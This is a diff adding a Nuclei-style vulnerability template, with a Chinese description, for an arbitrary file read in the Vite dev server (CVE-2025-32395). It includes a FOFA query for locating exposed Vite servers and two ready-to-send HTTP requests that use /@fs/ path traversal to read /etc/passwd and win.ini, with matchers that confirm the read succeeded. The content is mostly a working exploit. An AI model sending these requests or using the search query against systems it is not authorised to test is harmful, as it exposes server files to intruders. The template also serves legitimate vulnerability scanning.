@@ -1,0 +1,45 @@
+id: Vite-File-reading-CVE-2025-32395
+
+info:
+  name: "Vite 正则表达式与参数处理逻辑缺陷导致任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/\@vite/client"
+    该漏洞源于 Vite 在处理包含特定查询参数的 URL 时，其正则表达式匹配及参数解析逻辑存在缺陷，导致安全验证机制失效。攻击者可构造恶意请求路径，绕过访问控制策略，读取服务器上非授权文件。
+  reference:
+  - https://mp.weixin.qq.com/s/pEmlG4x8JvWTp7zCd-MFdQ
+  tags: Vite
+
+
+http:
+- raw:
+  - |
+    GET /@fs/Users/doggy/Desktop/vite-project/%23/../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:x'
+    - '/bin/bash'
+    condition: and
+  - type: status
+    status:
+    - 200
+- raw:
+  - |
+    GET /@fs/Users/doggy/Desktop/vite-project/%23/../../../../../c://windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '; for 16-bit app support'
+  - type: status
+    status:
+    - 200
